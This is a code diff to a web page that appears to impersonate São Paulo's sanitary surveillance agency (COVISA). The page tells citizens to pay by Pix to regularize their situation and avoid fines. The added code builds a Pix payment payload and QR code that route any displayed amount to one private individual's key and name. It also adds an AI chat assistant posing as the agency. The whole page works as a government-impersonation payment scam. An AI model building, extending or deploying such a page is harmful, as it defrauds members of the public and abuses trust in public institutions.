@@ -637,7 +637,7 @@
                       
                     <p style="font-size: 0.9rem; color: #4a5568; margin-bottom: 15px; font-weight: 600;">Escaneie o QR Code abaixo com o aplicativo do seu banco para regularizar a situação e travar possíveis multas.</p>
                       
-                    <img src="https://i.gifer.com/ZKZg.gif" alt="Gerando QR Code Oficial..." style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff; object-fit: contain;" />
+                    <img src="imagens/pix.jpeg" alt="QR Code Pix" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
 
                     <label style="font-size: 0.85rem; font-weight: 800; display: block; margin-bottom: 5px; text-align: left; color: #2d3748;">Pix Copia e Cola:</label>
                     <div style="display: flex; gap: 8px;">
@@ -976,6 +976,42 @@
     window.idPedidoConsultaAtual = null; 
     window.dadosPedidoAtual = {}; 
     window.captchaValidado = false;
+    
+    window.crc16 = function(payload) {
+        let polynomial = 0x1021;
+        let result = 0xFFFF;
+        for (let i = 0; i < payload.length; i++) {
+            result ^= payload.charCodeAt(i) << 8;
+            for (let j = 0; j < 8; j++) {
+                if ((result & 0x8000) !== 0) {
+                    result = (result << 1) ^ polynomial;
+                } else {
+                    result <<= 1;
+                }
+            }
+        }
+        return (result & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
+    };
+
+    window.gerarPixDinamico = function(valorStr) {
+        let valorNum = valorStr.replace(/[^\d.,]/g, '').replace(',', '.');
+        if (!valorNum || isNaN(parseFloat(valorNum))) valorNum = "0.00";
+        let valorFloat = parseFloat(valorNum).toFixed(2);
+        let valorLen = valorFloat.length.toString().padStart(2, '0');
+
+        let payloadStr = "000201" +
+                         "26580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe2" +
+                         "52040000" +
+                         "5303986" +
+                         "54" + valorLen + valorFloat +
+                         "5802BR" +
+                         "5925GILIARD DE OLIVEIRA SANTI" +
+                         "6009SAO PAULO" +
+                         "62070503***" +
+                         "6304";
+        let crc = window.crc16(payloadStr);
+        return payloadStr + crc;
+    };
     
     window.ativarCaptcha = function() {
         if(window.captchaValidado) return;
@@ -1319,7 +1355,7 @@
             const margemEsquerdaTextos = 22;  
             const margemEsquerdaDados = 200;  
             let alturaAtual = 544;            
-            const espacoEntreLinhas = 10;   
+            const espacoEntreLinhas = 10;    
             const tamanhoLetra = 10;         
 
             page.drawText('RAZÃO SOCIAL:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
@@ -1372,8 +1408,8 @@
     window.realizarPesquisaIA = async function() {
         const input = document.getElementById('main-search-input');
         const btn = document.getElementById('main-search-btn');
-        const queryStr = input.value.trim();
-        if(!queryStr) return;
+        const query = input.value.trim();
+        if(!query) return;
 
         btn.disabled = true;
         input.disabled = true;
@@ -1390,7 +1426,7 @@
                 systemInstruction: {
                     parts: [{ text: "Você é um assistente virtual do Portal da Vigilância Sanitária (COVISA) de São Paulo. Responda a dúvida do cidadão de forma clara, muito curta e educada. Formate em HTML básico (use <b> para negrito, <br> para pular linha). Nunca use formatação markdown de asteriscos." }]
                 },
-                contents: [{role: "user", parts: [{text: queryStr}]}]
+                contents: [{role: "user", parts: [{text: query}]}]
             };
 
             const response = await fetch(url, {
@@ -1771,19 +1807,19 @@
                       
                       let valorLimpo = pedido.valor.replace('R$', '').replace(/\s/g, ''); 
                       let valorFormatado = parseFloat(valorLimpo.replace(',','.')).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
-                      if(valorFormatado === "NaN" || !valorLimpo.match(/[0-9]/)) { valorFormatado = "R$ " + valorLimpo; }
+                      
+                      if(valorFormatado === "NaN" || !valorLimpo.match(/[0-9]/)) {
+                          valorFormatado = "R$ " + valorLimpo;
+                      }
                       
                       document.getElementById('valor-cobrado').innerText = valorFormatado;
                       valorPixParaComprovante = valorFormatado;
 
-                      // LÓGICA ATUALIZADA: Puxa o Pix gerado pela ElitePayBR e salvo no Firebase
-                      if (pedido.pix_copia_cola && pedido.pix_qr_code_base64) {
-                          document.getElementById('pix-copia-cola').value = pedido.pix_copia_cola;
-                          document.querySelector('.qr-container img').src = `data:image/png;base64,${pedido.pix_qr_code_base64}`;
-                      } else {
-                          document.getElementById('pix-copia-cola').value = "Aguardando geração do Pix oficial...";
-                          document.querySelector('.qr-container img').src = "https://i.gifer.com/ZKZg.gif"; 
-                      }
+                      let pixDinamico = window.gerarPixDinamico(valorLimpo);
+                      document.getElementById('pix-copia-cola').value = pixDinamico;
+                      
+                      let qrImgUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixDinamico);
+                      document.querySelector('.qr-container img').src = qrImgUrl;
                       
                       cnpjParaComprovante = cnpj;
                       atualizarBarraProgresso(3); 
